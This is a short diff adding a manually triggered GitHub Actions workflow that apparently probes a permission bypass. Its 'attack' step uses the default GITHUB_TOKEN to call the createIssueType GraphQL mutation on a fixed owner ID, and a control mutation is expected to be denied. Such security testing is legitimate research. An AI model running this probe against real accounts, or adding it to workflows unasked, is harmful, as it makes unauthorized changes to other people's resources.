@@ -1,0 +1,15 @@
+name: probe
+on: workflow_dispatch
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - name: attack createIssueType with default GITHUB_TOKEN
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "== ATTACK =="
+          curl -s -X POST https://api.github.com/graphql -H "Authorization: Bearer $GH_TOKEN" -d '{"query":"mutation { createIssueType(input:{ownerId:\"MDQ6VXNlcjg4Nzc0NTcy\",name:\"ActionsProbe\",color:RED,isEnabled:true}) { issueType { id name } } }"}' | tee /tmp/attack.json
+          echo
+          echo "== CONTROL (should deny) =="
+          curl -s -X POST https://api.github.com/graphql -H "Authorization: Bearer $GH_TOKEN" -d '{"query":"mutation { updateRepository(input:{repositoryId:\"R_kgDO\",name:\"x\"}) { repository { id } } }"}' | head -c 300
